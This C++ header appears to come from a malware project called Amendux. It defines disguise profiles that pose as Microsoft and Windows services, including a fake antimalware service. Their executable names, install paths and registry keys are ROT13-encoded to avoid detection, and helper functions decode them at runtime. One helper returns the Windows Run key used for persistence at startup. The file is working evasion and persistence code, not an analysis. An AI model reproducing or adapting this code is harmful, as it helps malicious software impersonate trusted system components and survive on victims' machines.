#pragma once

#define variantCount() (sizeof(variantDisplayName) / sizeof(variantDisplayName[0]))
#define staticVariant() -1

#define VARIANT_INVALID	1000

namespace Amendux {

#if DEBUG
	enum class VariantList {
		SHHLP = 0,
		IPICU,
		COMSRV,
		WAHP,
		NTKHB,
		MSMPE,
	};
#endif

	static const char *variantExeName[] = {
		"fuUyc",	// Microsoft Shell Helper (SHHLP)
		"vcVPH",	// Microsoft Input ICU (IPICU)
		"PbzFei",	// Windows COM Service (COMSRV)
		"JnUc",		// Windows Active Host Process (WAHP)
		"AGXuO",	// Mircosoft NT Kernel Hub (NTKHB)
		"ZfZcR",	// Microsoft Anitmalware Service (MSMPE)
	};

	static const char *variantDisplayName[] = {
		"Zvpebfbsg&Furyy&Urycre",			// Microsoft Shell Helper
		"Zvpebfbsg&Vachg&VPH",				// Microsoft Input ICU
		"Jvaqbjf&PBZ&Freivpr",				// Windows COM Service
		"Jvaqbjf&Npgvir&Ubfg&Cebprff",		// Windows Active Host Process
		"Zvepbfbsg&AG&Xreary&Uho",			// Mircosoft NT Kernel Hub
		"Zvpebfbsg&Navgznyjner&Freivpr",	// Microsoft Anitmalware Service
	};

	static const char *variantPath[] = {
		"{Zvpebfbsg{Jvaqbjf{{Furyy",		// Microsoft\Windows\Shell
		"{Zvpebfbsg{VPH",					// Microsoft\ICU
		"{Cnpxntrf{jvaqbjf_pbz_fei",		// Packages\windows_com_srv
		"{Zvpebfbsg{Ubfg&Genpxre",			// Microsoft\Host Tracker
		"{Zvpebfbsg{PegUho",				// Microsoft\CrtHub
		"{Zvpebfbsg{ZFOhvyq{ZfZc",			// Microsoft\MSBuild\MsMp
	};

	static const char *variantRegister[] = {
		"fbsgjner{zvpebfbsg{jvaqbjf{furyy",									// software\microsoft\windows\shell
		"fbsgjner{zvpebfbsg{fcryyvat{bcgvbaf",								// software\microsoft\spelling\options
		"fbsgjner{zvpebfbsg{jvaqbjf&ag{pheeragirefvba{vpz",					// software\microsoft\windows nt\currentversion\icm
		"fbsgjner{zvpebfbsg{vzr",											// software\microsoft\ime
		"fbsgjner{zvpebfbsg{jvaqbjf{pheeragirefvba{nccubfg",				// software\microsoft\windows\currentversion\apphost
		"fbsgjner{zvpebfbsg{jvaqbjf{pheeragirefvba{nhguragvpngvba",			// software\microsoft\windows\currentversion\authentication
	};

	//static_assert(static_cast<size_t>(VariantList::_COUNTER) == variantCount(), "Variant size differs among structures");

	namespace Variant {

		static unsigned int pickVariant() {
			if (staticVariant() > 0 && variantCount() < staticVariant()) {
				return staticVariant();
			}

			return rand() % variantCount();
		}

		static char *getExeName(unsigned int variant) {
			const char *encVar = variantExeName[variant];
			char *var = _strdup(encVar);

			Util::rot13<char>(var);

			return var;
		}

		static char *getDisplayName(unsigned int variant) {
			const char *encVar = variantDisplayName[variant];
			char *var = _strdup(encVar);

			Util::rot13<char>(var);

			return var;
		}

		static char *getPath(unsigned int variant) {
			const char *encVar = variantPath[variant];
			char *var = _strdup(encVar);

			Util::rot13<char>(var);

			return var;
		}

		static char *getRegister(unsigned int variant) {
			const char *encVar = variantRegister[variant];
			char *var = _strdup(encVar);

			Util::rot13<char>(var);

			return var;
		}

		static char *getExeExtension(unsigned int variant) {
			char *exe = _strdup("^rkr");

			Util::rot13<char>(exe);

			return exe;
		}

		static char *getRegisterRun(unsigned int variant) {
			char *run = _strdup("fbsgjner{zvpebfbsg{jvaqbjf{pheeragirefvba{eha");

			Util::rot13<char>(run);

			return run;
		}

	}

}
